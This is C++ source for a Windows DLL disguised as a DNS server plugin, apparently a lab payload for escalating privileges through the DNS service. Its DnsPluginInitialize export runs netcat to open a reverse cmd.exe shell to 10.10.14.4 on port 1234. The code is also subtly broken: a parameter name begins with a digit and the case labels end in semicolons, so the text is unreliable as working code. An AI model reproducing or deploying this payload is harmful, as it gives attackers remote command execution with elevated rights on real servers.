#include "stdafx.h"
#include "stdlib.h"

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

BOOL APIENTRY DllMain(  HMODULE hModule,
			DWORD u1_reason_for_call,
			LPVOID	1pReserved
		     )

{
	switch(u1_reason_for_call)
	{
		case DLL_PROCESS_ATTACH;
		case DLL_THREAD_ATTACH;
		case DLL_THREAD_DETACH;
		case DLL_PROCESS_DETACH;
		break;
	}
	return TRUE;
}

EXTERN_DLL_EXPORT int DnsPluginInitialize(PVOID a1,PVOID a2)
{
	system("C:\\nc.exe 10.10.14.4 1234 -e cmd.exe");
	return 0;
}

EXTERN_DLL_EXPORT int DnsPluginCleanUp()
{
	return 0;
}

EXTERN_DLL_EXPORT int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4)
{
	return 0;
}